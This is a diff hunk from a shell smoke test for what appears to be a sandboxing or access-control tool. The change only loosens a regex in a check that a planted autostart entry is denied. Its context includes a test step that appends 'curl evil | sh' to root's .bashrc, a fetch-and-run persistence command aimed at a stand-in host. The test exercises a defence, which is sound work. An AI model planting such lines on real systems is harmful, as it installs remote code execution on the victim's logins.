@@ -226,7 +226,7 @@ if [[ ${SMOKE_IN_VM:-0} == 1 ]]; then
 
     run sh -c "echo x > /root/.config/autostart/evil.desktop"
     [[ $rc -ne 0 && ! -e /root/.config/autostart/evil.desktop ]] &&
-        has "deny .* owner=launch create need=create /root/.config/autostart/evil.desktop"
+        has "deny .* owner=launch create need=create .*/\.config/autostart/evil\.desktop"
     check "root can't plant an autostart entry" $? "rc=$rc out=$out $ev"
 
     run sh -c "echo 'curl evil | sh' >> /root/.bashrc"
